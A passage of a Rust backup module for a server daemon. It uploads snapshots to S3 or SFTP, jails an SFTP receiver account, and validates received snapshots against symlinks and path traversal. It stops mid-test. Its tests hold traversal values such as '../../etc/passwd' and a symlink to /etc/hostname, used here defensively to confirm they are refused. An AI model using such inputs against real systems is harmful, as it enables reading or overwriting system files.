use std::path::{Path, PathBuf};
use std::time::Duration;

use daemon_audit::Actor;
use daemon_backup::remote::{self, S3Target};
use daemon_backup::{Manifest, Strategy};
use daemon_capability::{MachineOp, Operation, Request};
use daemon_jobs::{run_child, Failure, JobContext};
use daemon_protocol::BackupDestination;
use daemon_services::ManagedService;
use serde_json::{json, Value};
use tokio::process::Command;
use tracing::{info, warn};

use super::app::App;
use super::service_ops::container_of;

pub const RECEIVER_USER: &str = "serveros-backups";
/// The receiver's home, and the jail its SFTP sessions are locked in: owned
/// by root, so nothing inside can change the jail or the keys that open it.
const RECEIVER_HOME: &str = "/var/lib/serveros-backups";
/// Inside the jail, the one folder senders can write to. Sessions start
/// here, so the relative paths senders use land in it.
const RECEIVER_DATA: &str = "backups";

const SSHD_CONFIG: &str = "/etc/ssh/sshd_config";
const SSHD_DROP_IN: &str = "/etc/ssh/sshd_config.d/serveros-backups.conf";
const SSHD_BEGIN: &str = "# BEGIN serveros-backups (managed by serverosd)";
const SSHD_END: &str = "# END serveros-backups";

const NO_LOGIN: &[&str] = &[
    "/usr/sbin/nologin",
    "/sbin/nologin",
    "/usr/bin/false",
    "/bin/false",
];

/// What a receiver job does to the keys allowed in.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ReceiverKeys {
    /// Keep the keys already there and add this one (panels that only send one).
    Add(String),
    /// Exactly these keys, and no others; none switches the receiver off.
    Exactly(Vec<String>),
}

pub fn secrets(destination: &BackupDestination) -> Vec<String> {
    match destination {
        BackupDestination::S3 { secret_key, .. } => vec![secret_key.clone()],
        BackupDestination::Sftp { private_key, .. } => vec![private_key.clone()],
    }
}

pub async fn backup_to(
    app: &App,
    ctx: &JobContext,
    service: &ManagedService,
    reason: &str,
    prefix: &str,
    destination: &BackupDestination,
) -> Result<Value, Failure> {
    let strategy = strategy_for(service).await?;
    ctx.progress
        .line(format!(
            "backing up {} with {}",
            service.name,
            strategy.label()
        ))
        .await;

    let estimate = app
        .snapshotter
        .list(&service.name)
        .last()
        .map(|m| m.total_bytes)
        .unwrap_or(256 * 1024 * 1024);
    let mut cancel = ctx.cancel.clone();
    let mut manifest = app
        .snapshotter
        .take(
            service,
            &strategy,
            reason,
            estimate,
            &mut cancel,
            &ctx.progress,
        )
        .await?;
    let dir = app
        .snapshotter
        .service_dir(&service.name)
        .join(&manifest.id);
    let base = object_base(prefix, &service.name, &manifest.id);

    let location = match destination {
        BackupDestination::S3 { bucket, .. } => format!("s3://{bucket}/{base}"),
        BackupDestination::Sftp { host, .. } => format!("sftp://{host}/{base}"),
    };
    manifest.uploaded_to = Some(location.clone());
    std::fs::write(
        dir.join("manifest.json"),
        serde_json::to_vec_pretty(&manifest).unwrap_or_default(),
    )
    .map_err(|e| Failure::new("record", e.to_string()))?;

    ctx.progress.phase("upload", Some(96)).await;
    let mut names: Vec<String> = manifest.files.iter().map(|f| f.name.clone()).collect();
    names.push("manifest.json".into());

    match destination {
        BackupDestination::S3 {
            endpoint,
            region,
            bucket,
            access_key,
            secret_key,
            path_style,
        } => {
            let target = S3Target {
                endpoint: endpoint.clone(),
                region: region.clone(),
                bucket: bucket.clone(),
                access_key: access_key.clone(),
                secret_key: secret_key.clone(),
                path_style: *path_style,
            };
            let host = target.host();
            for name in &names {
                ctx.progress.line(format!("uploading {name}")).await;
                remote::upload(&target, &format!("{base}/{name}"), &dir.join(name), |h| {
                    h == host
                })
                .await?;
            }
        }
        BackupDestination::Sftp {
            host,
            port,
            user,
            private_key,
            host_key,
        } => {
            sftp_upload(
                ctx,
                &dir,
                &names,
                &base,
                host,
                *port,
                user,
                private_key,
                host_key.as_deref(),
            )
            .await?;
        }
    }

    Ok(summary(&manifest, &location))
}

fn summary(manifest: &Manifest, location: &str) -> Value {
    json!({
        "snapshot": manifest.id,
        "strategy": manifest.strategy,
        "bytes": manifest.total_bytes,
        "files": manifest.files.len(),
        "location": location,
    })
}

fn object_base(prefix: &str, service: &str, snapshot: &str) -> String {
    let service: String = service
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || "-_.".contains(c) {
                c
            } else {
                '-'
            }
        })
        .collect();

    [prefix.trim_matches('/'), &service, snapshot]
        .into_iter()
        .filter(|s| !s.is_empty())
        .collect::<Vec<_>>()
        .join("/")
}

/// How to copy a service's data, or why there's nothing to copy. Containers
/// go by what they run and mount, read now: a database's own dump tool, or
/// their mounts; everything else by what's known about it.
pub async fn strategy_for(service: &ManagedService) -> Result<Strategy, Failure> {
    let Some(container) = container_of(service) else {
        return Strategy::for_service(service).ok_or_else(|| {
            Failure::new(
                "backup",
                format!("ServerOS does not know how to snapshot {}", service.name),
            )
            .with_next_step("Set a data directory for the service, or back it up by files.")
        });
    };

    container_strategy(container).await?.ok_or_else(|| {
        Failure::new(
            "backup",
            format!("{} keeps no data outside its container", service.name),
        )
        .with_next_step("There is nothing to back up; redeploying it gets it back.")
    })
}

/// Like `strategy_for`, but None when there's simply nothing to copy, so a
/// deploy can snapshot what has data and pass over what doesn't.
pub async fn data_strategy(service: &ManagedService) -> Result<Option<Strategy>, Failure> {
    match container_of(service) {
        None => Ok(Strategy::for_service(service)),
        Some(container) => container_strategy(container).await,
    }
}

async fn container_strategy(container: &str) -> Result<Option<Strategy>, Failure> {
    let output = Command::new("docker")
        .args([
            "inspect",
            "-f",
            "{{.State.Running}}\n{{.Config.Image}}\n{{range .Config.Env}}env {{.}}\n{{end}}{{range .Mounts}}mount {{.Source}}\n{{end}}",
            container,
        ])
        .output()
        .await
        .map_err(|e| Failure::new("backup", format!("could not run docker: {e}")))?;
    if !output.status.success() {
        return Err(Failure::new(
            "backup",
            format!(
                "docker could not inspect {container}: {}",
                String::from_utf8_lossy(&output.stderr).trim()
            ),
        ));
    }

    let text = String::from_utf8_lossy(&output.stdout);
    let mut lines = text.lines();
    let running = lines.next().unwrap_or("").trim() == "true";
    let image = lines.next().unwrap_or("").trim().to_string();
    let (mut env, mut mounts) = (Vec::new(), Vec::new());
    for line in lines {
        if let Some(e) = line.strip_prefix("env ") {
            env.push(e.to_string());
        } else if let Some(m) = line.strip_prefix("mount ") {
            mounts.push(m.to_string());
        }
    }

    Ok(Strategy::for_container(
        container,
        &image,
        &env,
        existing(mount_paths(&mounts.join("\n"))),
        running,
    ))
}

/// Mount sources still on disk. A stack deployed before its files were kept
/// can still point at a deploy folder that's gone, with nothing there to copy.
fn existing(paths: Vec<PathBuf>) -> Vec<PathBuf> {
    paths.into_iter().filter(|p| p.exists()).collect()
}

fn mount_paths(inspect: &str) -> Vec<PathBuf> {
    daemon_backup::strategy::backup_paths(inspect.lines())
}

#[allow(clippy::too_many_arguments)]
async fn sftp_upload(
    ctx: &JobContext,
    dir: &Path,
    names: &[String],
    base: &str,
    host: &str,
    port: u16,
    user: &str,
    private_key: &str,
    host_key: Option<&str>,
) -> Result<(), Failure> {
    let scratch = dir.join(".sftp");
    std::fs::create_dir_all(&scratch).map_err(|e| Failure::new("upload", e.to_string()))?;
    let result = async {
        let key = scratch.join("key");
        let known = scratch.join("known_hosts");
        let batch = scratch.join("batch");
        write_private(&key, &format!("{}\n", private_key.trim()))?;

        let host_pattern = if port == 22 {
            host.to_string()
        } else {
            format!("[{host}]:{port}")
        };
        write_private(
            &known,
            &host_key
                .map(|k| format!("{host_pattern} {}\n", k.trim()))
                .unwrap_or_default(),
        )?;

        let mut script = String::new();
        let mut path = String::new();
        for part in base.split('/') {
            path = if path.is_empty() { part.into() } else { format!("{path}/{part}") };
            script.push_str(&format!("-mkdir {path}\n"));
        }
        for name in names {
            script.push_str(&format!(
                "put {} {base}/{name}\n",
                dir.join(name).to_string_lossy()
            ));
        }
        write_private(&batch, &script)?;

        let port = port.to_string();
        let target = format!("{user}@{host}");
        let options = [
            format!("UserKnownHostsFile={}", known.to_string_lossy()),
            format!(
                "StrictHostKeyChecking={}",
                if host_key.is_some() { "yes" } else { "accept-new" }
            ),
        ];
        let key_path = key.to_string_lossy().into_owned();
        let batch_path = batch.to_string_lossy().into_owned();
        let args = [
            "-b",
            &batch_path,
            "-i",
            &key_path,
            "-P",
            &port,
            "-o",
            "BatchMode=yes",
            "-o",
            "IdentitiesOnly=yes",
            "-o",
            "ConnectTimeout=20",
            "-o",
            &options[0],
            "-o",
            &options[1],
            &target,
        ];

        ctx.progress.line(format!("sending to {host} over SFTP")).await;
        let mut cancel = ctx.cancel.clone();
        let outcome = run_child(
            "sftp",
            &args,
            None,
            &[],
            Duration::from_secs(6 * 3600),
            &mut cancel,
            &ctx.progress,
            None,
        )
        .await;

        if outcome.success() {
            Ok(())
        } else {
            Err(Failure::new("upload", format!("could not send the backup to {host}"))
                .with_output(outcome.tail().to_vec())
                .with_next_step(
                    "Check that the receiving machine is online and that SSH (port 22) is open to this one.",
                ))
        }
    }
    .await;

    let _ = std::fs::remove_dir_all(&scratch);
    result
}

fn write_private(path: &Path, contents: &str) -> Result<(), Failure> {
    use std::io::Write;
    use std::os::unix::fs::OpenOptionsExt;

    std::fs::OpenOptions::new()
        .write(true)
        .create(true)
        .truncate(true)
        .mode(0o600)
        .open(path)
        .and_then(|mut f| f.write_all(contents.as_bytes()))
        .map_err(|e| Failure::new("upload", format!("{}: {e}", path.display())))
}

pub async fn receiver(keys: ReceiverKeys) -> Result<Value, Failure> {
    let wanted = match &keys {
        ReceiverKeys::Add(key) => vec![key.clone()],
        ReceiverKeys::Exactly(keys) => keys.clone(),
    };
    if wanted.iter().any(|k| !super::machine::valid_public_key(k)) {
        return Err(Failure::new(
            "receiver",
            "that is not a public key ServerOS recognises",
        ));
    }
    if !supports_chroot_sftp() {
        return Err(
            Failure::new("receiver", "OpenSSH's SFTP server is not installed")
                .with_next_step("Install openssh-server on this machine, then try again."),
        );
    }

    if !user_exists(RECEIVER_USER).await {
        run(
            "useradd",
            &[
                "--system",
                "--home-dir",
                RECEIVER_HOME,
                "--shell",
                no_login(),
                RECEIVER_USER,
            ],
        )
        .await?;
    }
    harden(Some(keys)).await?;

    let host_key = ["ed25519", "ecdsa", "rsa"].iter().find_map(|kind| {
        std::fs::read_to_string(format!("/etc/ssh/ssh_host_{kind}_key.pub"))
            .ok()
            .map(|k| k.split_whitespace().take(2).collect::<Vec<_>>().join(" "))
    });

    Ok(json!({
        "user": RECEIVER_USER,
        "home": RECEIVER_HOME,
        "host_key": host_key,
    }))
}

/// Brings a receiver set up by an older daemon onto the jailed layout, keeping
/// the keys it has. Runs on start; nothing happens on machines that aren't one.
pub async fn harden_on_start(app: std::sync::Arc<App>) {
    if !user_exists(RECEIVER_USER).await {
        return;
    }
    let grant = match app.broker.authorize(Request {
        actor: Actor::daemon(),
        operation: Operation::Machine(MachineOp::ManageSshKeys {
            user: RECEIVER_USER.into(),
        }),
        confirmed: false,
    }) {
        Ok(grant) => grant,
        Err(denied) => {
            warn!(reason = %denied, "not locking the backup receiver into its folder");
            return;
        }
    };
    let result = harden(None).await;
    grant.finish(
        &result.as_ref().map(|_| ()),
        Some("backup receiver locked into its folder on start"),
    );
    match result {
        Ok(()) => info!("backup receiver is locked into its folder"),
        Err(e) => warn!(error = %e.message, "couldn't lock the backup receiver into its folder"),
    }
}

/// Locks the receiver account into its jail: SFTP only, inside
/// RECEIVER_HOME, starting in RECEIVER_DATA, with the keys file owned by
/// root. `keys` changes who's allowed in; None keeps the keys already there.
async fn harden(keys: Option<ReceiverKeys>) -> Result<(), Failure> {
    run(
        "usermod",
        &["--shell", no_login(), "-p", "*", RECEIVER_USER],
    )
    .await?;
    let (uid, gid, _, _) = daemon_streams::pty::lookup(RECEIVER_USER)
        .ok_or_else(|| Failure::new("receiver", format!("user {RECEIVER_USER} is missing")))?;

    let home = Path::new(RECEIVER_HOME);
    let data = home.join(RECEIVER_DATA);
    let ssh_dir = home.join(".ssh");
    let file = ssh_dir.join("authorized_keys");
    let fail = |e: std::io::Error| Failure::new("receiver", e.to_string());

    std::fs::create_dir_all(&data).map_err(fail)?;
    std::fs::create_dir_all(&ssh_dir).map_err(fail)?;
    // Backups an older daemon wrote straight into the home move into the
    // data folder, where senders' paths now resolve.
    let names: Vec<String> = std::fs::read_dir(home)
        .map_err(fail)?
        .filter_map(|e| e.ok())
        .map(|e| e.file_name().to_string_lossy().into_owned())
        .collect();
    for name in entries_to_move(&names) {
        let target = data.join(&name);
        if !target.exists() {
            std::fs::rename(home.join(&name), target).map_err(fail)?;
        }
    }

    let existing = std::fs::read_to_string(&file).unwrap_or_default();
    let contents = authorized_keys(&existing, keys.as_ref());
    if contents != existing {
        std::fs::write(&file, contents).map_err(fail)?;
    }

    // The jail and everything above the data folder belong to root, as sshd
    // requires for ChrootDirectory; only the data folder is the account's.
    for (path, owner, mode) in [
        (home, (0, 0), 0o755),
        (ssh_dir.as_path(), (0, 0), 0o755),
        (file.as_path(), (0, 0), 0o644),
        (data.as_path(), (uid, gid), 0o700),
    ] {
        std::os::unix::fs::chown(path, Some(owner.0), Some(owner.1)).map_err(fail)?;
        std::fs::set_permissions(path, std::os::unix::fs::PermissionsExt::from_mode(mode))
            .map_err(fail)?;
    }

    install_sshd_jail().await
}

/// Writes the Match block that jails the account, as a drop-in when sshd
/// reads them and at the end of sshd_config when it doesn't, checks it with
/// `sshd -t` (putting things back if it fails) and reloads sshd.
async fn install_sshd_jail() -> Result<(), Failure> {
    let main = std::fs::read_to_string(SSHD_CONFIG).unwrap_or_default();
    let fail = |e: std::io::Error| Failure::new("receiver", e.to_string());

    let (path, before, after) = if reads_drop_ins(&main) {
        let before = std::fs::read_to_string(SSHD_DROP_IN).ok();
        let after = sshd_match_block();
        (SSHD_DROP_IN, before, after)
    } else {
        (SSHD_CONFIG, Some(main.clone()), with_managed_block(&main))
    };
    if before.as_deref() == Some(after.as_str()) {
        return Ok(());
    }

    if let Some(parent) = Path::new(path).parent() {
        std::fs::create_dir_all(parent).map_err(fail)?;
    }
    std::fs::write(path, &after).map_err(fail)?;
    let _ = std::fs::set_permissions(path, std::os::unix::fs::PermissionsExt::from_mode(0o644));

    if let Err(e) = run(sshd_binary(), &["-t"]).await {
        match before {
            Some(old) => {
                let _ = std::fs::write(path, old);
            }
            None => {
                let _ = std::fs::remove_file(path);
            }
        }
        return Err(Failure::new(
            "receiver",
            "sshd didn't accept the settings that lock backups into their folder, so nothing was changed",
        )
        .with_output(vec![e.message.to_string()]));
    }

    for unit in ["ssh", "sshd"] {
        let active = Command::new("systemctl")
            .args(["is-active", "--quiet", unit])
            .status()
            .await
            .map(|s| s.success())
            .unwrap_or(false);
        if active {
            run("systemctl", &["reload", unit]).await?;
            break;
        }
    }
    Ok(())
}

fn sshd_match_block() -> String {
    format!(
        "# Backups other machines send here over SFTP: locked into {RECEIVER_HOME},\n\
         # SFTP only. Written by serverosd; changes are overwritten.\n\
         Match User {RECEIVER_USER}\n\
         \x20   ChrootDirectory {RECEIVER_HOME}\n\
         \x20   ForceCommand internal-sftp -d /{RECEIVER_DATA}\n\
         \x20   AllowTcpForwarding no\n\
         \x20   AllowAgentForwarding no\n\
         \x20   X11Forwarding no\n\
         \x20   PermitTunnel no\n\
         \x20   PermitTTY no\n"
    )
}

/// sshd_config with the jail's Match block at its end, where a Match block
/// can't swallow the settings after it, replacing one written before.
fn with_managed_block(main: &str) -> String {
    let mut kept = String::new();
    let mut inside = false;
    for line in main.lines() {
        if line.trim() == SSHD_BEGIN {
            inside = true;
        } else if line.trim() == SSHD_END {
            inside = false;
        } else if !inside {
            kept.push_str(line);
            kept.push('\n');
        }
    }
    format!(
        "{}\n{SSHD_BEGIN}\n{}{SSHD_END}\n",
        kept.trim_end(),
        sshd_match_block()
    )
}

/// Whether sshd_config includes /etc/ssh/sshd_config.d/*.conf.
fn reads_drop_ins(main: &str) -> bool {
    main.lines().any(|line| {
        let mut words = line.split_whitespace();
        words
            .next()
            .is_some_and(|w| w.eq_ignore_ascii_case("include"))
            && words.any(|w| w.contains("sshd_config.d"))
    })
}

/// The authorized_keys file for the receiver: each key allowed only SFTP,
/// in the data folder.
fn authorized_keys(existing: &str, change: Option<&ReceiverKeys>) -> String {
    let mut keys: Vec<String> = match change {
        Some(ReceiverKeys::Exactly(keys)) => keys.iter().map(|k| bare_key(k)).collect(),
        _ => existing.lines().filter_map(key_in_line).collect(),
    };
    if let Some(ReceiverKeys::Add(key)) = change {
        keys.push(bare_key(key));
    }
    let mut seen = std::collections::HashSet::new();
    keys.retain(|k| !k.is_empty() && seen.insert(k.clone()));

    keys.iter()
        .map(|key| {
            format!(
                "restrict,command=\"internal-sftp -d /{RECEIVER_DATA}\" {key} {RECEIVER_USER}\n"
            )
        })
        .collect()
}

/// "algorithm base64" from a public key, dropping its comment.
fn bare_key(key: &str) -> String {
    key.split_whitespace().take(2).collect::<Vec<_>>().join(" ")
}

/// The key in an authorized_keys line, after any options before it.
fn key_in_line(line: &str) -> Option<String> {
    let line = line.trim();
    if line.is_empty() || line.starts_with('#') {
        return None;
    }
    let words: Vec<&str> = line.split_whitespace().collect();
    words.iter().enumerate().find_map(|(i, w)| {
        let candidate = format!("{w} {}", words.get(i + 1).unwrap_or(&""));
        super::machine::valid_public_key(&candidate).then(|| bare_key(&candidate))
    })
}

/// Entries an older daemon left in the home that belong in the data folder:
/// everything but the keys, the data folder and the account's dotfiles.
fn entries_to_move(names: &[String]) -> Vec<String> {
    let mut moving: Vec<String> = names
        .iter()
        .filter(|n| n.as_str() != RECEIVER_DATA && !n.starts_with('.'))
        .cloned()
        .collect();
    moving.sort();
    moving
}

/// Puts a snapshot another machine sent to this one's receiver under this
/// machine's own snapshots of `service`, so it restores like one taken here,
/// and returns the folder it was sent to. Whoever holds a receiver key could
/// have written it, so it's checked first: a plain path in the receiver's
/// folder with no links on the way, a manifest for this snapshot made the
/// way this service restores, plain files only (read without following
/// links), and for files, nothing outside the folders the service keeps its
/// data in here. The restore then checks every file against its checksum.
pub async fn take_received(
    app: &App,
    service: &ManagedService,
    strategy: &Strategy,
    received: &str,
    snapshot: &str,
) -> Result<PathBuf, Failure> {
    let data = Path::new(RECEIVER_HOME).join(RECEIVER_DATA);
    let from = received_dir(&data, received, snapshot)?;
    let to = app
        .snapshotter
        .service_dir(&service.name)
        .join(sanitise_part(snapshot));
    let label = strategy.label().to_string();
    let name = service.name.clone();

    let (from, to) = tokio::task::spawn_blocking(move || {
        copy_received(&from, &to, &label, &name).map(|()| (from, to))
    })
    .await
    .map_err(|e| Failure::new("receive", e.to_string()))??;

    if let Strategy::Files { paths } = strategy {
        if let Err(e) = archive_within(&to.join("files.tar.gz"), paths).await {
            let _ = std::fs::remove_dir_all(&to);
            return Err(e);
        }
    }
    Ok(from)
}

/// The folder a received snapshot is in: `received` must be a relative path
/// of plain names ending in the snapshot's id, with no links on the way.
fn received_dir(data: &Path, received: &str, snapshot: &str) -> Result<PathBuf, Failure> {
    let refuse = || {
        Failure::new(
            "receive",
            format!("{received} isn't a snapshot this machine received"),
        )
    };
    let parts: Vec<&str> = received.split('/').collect();
    if parts.len() > 16 || parts.last() != Some(&snapshot) || !parts.iter().all(|p| plain_name(p)) {
        return Err(refuse());
    }

    let mut path = data.to_path_buf();
    for part in parts {
        path.push(part);
        // symlink_metadata doesn't follow a link, so a link isn't a dir here.
        match std::fs::symlink_metadata(&path) {
            Ok(meta) if meta.is_dir() => {}
            _ => return Err(refuse()),
        }
    }
    Ok(path)
}

/// A file or folder name a sender may use: no separators, no `..`, no
/// hidden names, nothing a shell or tar would read specially.
fn plain_name(part: &str) -> bool {
    !part.is_empty()
        && part.len() <= 128
        && !part.starts_with('.')
        && part
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || "-_.".contains(c))
}

fn sanitise_part(part: &str) -> String {
    part.chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || "-_.".contains(c) {
                c
            } else {
                '-'
            }
        })
        .collect()
}

const MAX_MANIFEST_BYTES: u64 = 1024 * 1024;

fn copy_received(from: &Path, to: &Path, label: &str, service: &str) -> Result<(), Failure> {
    let fail = |message: String| Failure::new("receive", message);

    let manifest_bytes = read_plain(&from.join("manifest.json"), MAX_MANIFEST_BYTES)
        .map_err(|e| fail(format!("its manifest couldn't be read: {e}")))?;
    let manifest: Manifest = serde_json::from_slice(&manifest_bytes)
        .map_err(|e| fail(format!("its manifest isn't one ServerOS wrote: {e}")))?;
    check_received(&manifest, from, label, service)?;

    if to.exists() {
        // A retry: the same snapshot was put here before and not restored yet.
        let same = std::fs::read(to.join("manifest.json"))
            .ok()
            .and_then(|b| serde_json::from_slice::<Manifest>(&b).ok())
            .is_some_and(|m| m == manifest);
        return if same {
            Ok(())
        } else {
            Err(fail(format!(
                "{service} already has a snapshot called {}",
                manifest.id
            )))
        };
    }

    std::fs::create_dir_all(to).map_err(|e| fail(e.to_string()))?;
    let _ = std::fs::set_permissions(to, std::os::unix::fs::PermissionsExt::from_mode(0o700));
    let copied = manifest
        .files
        .iter()
        .map(|f| f.name.as_str())
        .chain(["manifest.json"])
        .try_for_each(|name| copy_plain(&from.join(name), &to.join(name)).map(|_| ()))
        .map_err(|e| fail(format!("it couldn't be copied: {e}")));
    if copied.is_err() {
        let _ = std::fs::remove_dir_all(to);
    }
    copied
}

/// A received manifest is for the snapshot it claims, made the way this
/// service restores, and names only plain files beside it.
fn check_received(
    manifest: &Manifest,
    from: &Path,
    label: &str,
    service: &str,
) -> Result<(), Failure> {
    let fail = |message: String| Failure::new("receive", message);
    if from.file_name().and_then(|n| n.to_str()) != Some(manifest.id.as_str()) {
        return Err(fail("its manifest is for a different snapshot".into()));
    }
    if manifest.strategy != label {
        return Err(fail(format!(
            "it was made with {}, and {service} restores with {label}",
            manifest.strategy
        )));
    }
    if manifest.files.is_empty()
        || manifest
            .files
            .iter()
            .any(|f| !plain_name(&f.name) || f.name == "manifest.json")
    {
        return Err(fail(
            "its manifest names files ServerOS doesn't write".into(),
        ));
    }
    Ok(())
}

/// Opens a regular file without following a link to it.
fn open_plain(path: &Path) -> std::io::Result<std::fs::File> {
    use std::os::unix::fs::OpenOptionsExt;
    let file = std::fs::OpenOptions::new()
        .read(true)
        .custom_flags(libc::O_NOFOLLOW)
        .open(path)?;
    if !file.metadata()?.is_file() {
        return Err(std::io::Error::new(
            std::io::ErrorKind::InvalidData,
            format!("{} isn't a plain file", path.display()),
        ));
    }
    Ok(file)
}

fn read_plain(path: &Path, max: u64) -> std::io::Result<Vec<u8>> {
    use std::io::Read;
    let mut bytes = Vec::new();
    open_plain(path)?.take(max + 1).read_to_end(&mut bytes)?;
    if bytes.len() as u64 > max {
        return Err(std::io::Error::new(
            std::io::ErrorKind::InvalidData,
            "it's too big",
        ));
    }
    Ok(bytes)
}

fn copy_plain(from: &Path, to: &Path) -> std::io::Result<u64> {
    use std::os::unix::fs::OpenOptionsExt;
    let mut source = open_plain(from)?;
    let mut target = std::fs::OpenOptions::new()
        .write(true)
        .create_new(true)
        .mode(0o600)
        .open(to)?;
    std::io::copy(&mut source, &mut target)
}

/// Refuses a files snapshot with anything outside `paths`, the folders the
/// service keeps its data in on this machine: it's put back from /, so an
/// entry anywhere else would land where the sender chose.
async fn archive_within(archive: &Path, paths: &[PathBuf]) -> Result<(), Failure> {
    use tokio::io::AsyncBufReadExt;

    let roots: Vec<String> = paths
        .iter()
        .map(|p| p.to_string_lossy().trim_matches('/').to_string())
        .filter(|r| !r.is_empty())
        .collect();
    let mut child = Command::new("tar")
        .args(["-tzf", &archive.to_string_lossy()])
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::null())
        .spawn()
        .map_err(|e| Failure::new("receive", format!("could not run tar: {e}")))?;
    let stdout = child
        .stdout
        .take()
        .ok_or_else(|| Failure::new("receive", "tar gave no listing"))?;

    let mut lines = tokio::io::BufReader::new(stdout).lines();
    let mut outside = None;
    while let Ok(Some(entry)) = lines.next_line().await {
        if outside.is_none() && !entry_within(&entry, &roots) {
            outside = Some(entry);
        }
    }
    let status = child
        .wait()
        .await
        .map_err(|e| Failure::new("receive", e.to_string()))?;

    match outside {
        Some(entry) => Err(Failure::new(
            "receive",
            format!("{entry} in the snapshot is outside the service's folders here, so nothing was restored"),
        )
        .with_next_step(
            "The service keeps its data in different folders on this machine. Copy it by hand.",
        )),
        None if !status.success() => Err(Failure::new("receive", "the snapshot's files couldn't be listed")),
        None => Ok(()),
    }
}

/// Whether a tar entry is one of `roots` or inside one, with no `..`.
fn entry_within(entry: &str, roots: &[String]) -> bool {
    let entry = entry
        .trim_start_matches("./")
        .trim_start_matches('/')
        .trim_end_matches('/');
    if entry.is_empty() || entry.split('/').any(|p| p == "..") {
        return false;
    }
    roots
        .iter()
        .any(|root| entry == root || entry.starts_with(&format!("{root}/")))
}

fn no_login() -> &'static str {
    NO_LOGIN
        .iter()
        .find(|p| Path::new(p).is_file())
        .copied()
        .unwrap_or("/usr/sbin/nologin")
}

fn sshd_binary() -> &'static str {
    ["/usr/sbin/sshd", "/sbin/sshd", "/usr/bin/sshd"]
        .iter()
        .find(|p| Path::new(p).is_file())
        .copied()
        .unwrap_or("sshd")
}

/// internal-sftp is built into sshd, so a jail needs no SFTP binary inside
/// it; sshd itself has to be there.
fn supports_chroot_sftp() -> bool {
    Path::new(sshd_binary()).is_file()
}

async fn user_exists(user: &str) -> bool {
    Command::new("id")
        .args(["-u", user])
        .output()
        .await
        .map(|o| o.status.success())
        .unwrap_or(false)
}

async fn run(program: &str, args: &[&str]) -> Result<(), Failure> {
    let output = Command::new(program)
        .args(args)
        .output()
        .await
        .map_err(|e| Failure::new("receiver", format!("could not run {program}: {e}")))?;
    if output.status.success() {
        Ok(())
    } else {
        Err(Failure::new(
            "receiver",
            format!(
                "{program} failed: {}",
                String::from_utf8_lossy(&output.stderr).trim()
            ),
        ))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn sent(dir: &Path, id: &str, strategy: &str, files: &[(&str, &str)]) -> PathBuf {
        let folder = dir.join("moves/7/shop-db-1").join(id);
        std::fs::create_dir_all(&folder).unwrap();
        for (name, body) in files {
            std::fs::write(folder.join(name), body).unwrap();
        }
        let manifest = Manifest {
            service: "shop-db-1".into(),
            id: id.into(),
            created_at: 1_700_000_000,
            reason: "move".into(),
            strategy: strategy.into(),
            files: files
                .iter()
                .map(|(name, body)| daemon_backup::snapshot::ManifestFile {
                    name: (*name).into(),
                    bytes: body.len() as u64,
                    sha256: String::new(),
                })
                .collect(),
            total_bytes: 0,
            uploaded_to: None,
        };
        std::fs::write(
            folder.join("manifest.json"),
            serde_json::to_vec(&manifest).unwrap(),
        )
        .unwrap();
        folder
    }

    #[test]
    fn a_received_snapshot_is_a_plain_path_in_the_receivers_folder() {
        let data = tempfile::tempdir().unwrap();
        let folder = sent(
            data.path(),
            "1700-move",
            "pg_dumpall",
            &[("postgres.sql", "")],
        );

        assert_eq!(
            received_dir(data.path(), "moves/7/shop-db-1/1700-move", "1700-move").unwrap(),
            folder
        );
        for bad in [
            "moves/7/shop-db-1/1700-other",
            "../etc/1700-move",
            "/moves/7/shop-db-1/1700-move",
            "moves//1700-move",
            "moves/.hidden/1700-move",
            "moves/7/missing/1700-move",
        ] {
            assert!(
                received_dir(data.path(), bad, "1700-move").is_err(),
                "{bad}"
            );
        }

        std::os::unix::fs::symlink(data.path().join("moves"), data.path().join("link")).unwrap();
        assert!(received_dir(data.path(), "link/7/shop-db-1/1700-move", "1700-move").is_err());
    }

    #[test]
    fn a_received_snapshot_is_copied_once_and_checked_first() {
        let data = tempfile::tempdir().unwrap();
        let own = tempfile::tempdir().unwrap();
        let from = sent(
            data.path(),
            "1700-move",
            "pg_dumpall",
            &[("postgres.sql", "select 1;")],
        );
        let to = own.path().join("1700-move");

        copy_received(&from, &to, "pg_dumpall", "shop-db-1").unwrap();
        assert_eq!(
            std::fs::read_to_string(to.join("postgres.sql")).unwrap(),
            "select 1;"
        );
        // A retry finds it already there.
        copy_received(&from, &to, "pg_dumpall", "shop-db-1").unwrap();

        let other = own.path().join("other");
        let wrong = copy_received(&from, &other, "tar", "shop-db-1").unwrap_err();
        assert!(wrong.message.contains("made with pg_dumpall"));
        assert!(!other.exists());
    }

    #[test]
    fn a_received_snapshot_with_links_or_strange_names_is_refused() {
        let data = tempfile::tempdir().unwrap();
        let own = tempfile::tempdir().unwrap();

        let from = sent(data.path(), "1700-a", "tar", &[("files.tar.gz", "")]);
        std::fs::remove_file(from.join("files.tar.gz")).unwrap();
        std::os::unix::fs::symlink("/etc/hostname", from.join("files.tar.gz")).unwrap();
        assert!(copy_received(&from, &own.path().join("a"), "tar", "s").is_err());
        assert!(!own.path().join("a").exists());

        let from = sent(data.path(), "1700-b", "tar", &[("files.tar.gz", "")]);
        let mut manifest: Manifest =
            serde_json::from_slice(&std::fs::read(from.join("manifest.json")).unwrap()).unwrap();
        manifest.files[0].name = "../../etc/passwd".into();
        std::fs::write(
            from.join("manifest.json"),
            serde_json::to_vec(&manifest).unwrap(),
        )
        .unwrap();
        assert!(copy_received(&from, &own.path().join("b"), "tar", "s").is_err());

        let from = sent(data.path(), "1700-c", "tar", &[("files.tar.gz", "")]);
        let mut manifest: Manifest =
            serde_json::from_slice(&std::fs::read(from.join("manifest.json")).unwrap()).unwrap();
        manifest.id = "1700-other".into();
        std::fs::write(
            from.join("manifest.json"),
            serde_json::to_vec(&manifest).unwrap(),
        )
        .unwrap();
        assert!(copy_received(&from, &own.path().join("c"), "tar", "s").is_err());
    }

    #[test]
    fn a_files_snapshot_stays_inside_the_services_folders() {
        let roots = vec!["var/lib/docker/volumes/serveros-shop_data/_data".to_string()];
        assert!(entry_within(
            "var/lib/docker/volumes/serveros-shop_data/_data/",
            &roots
        ));
        assert!(entry_within(
            "var/lib/docker/volumes/serveros-shop_data/_data/a/b.txt",
            &roots
        ));
        assert!(!entry_within(
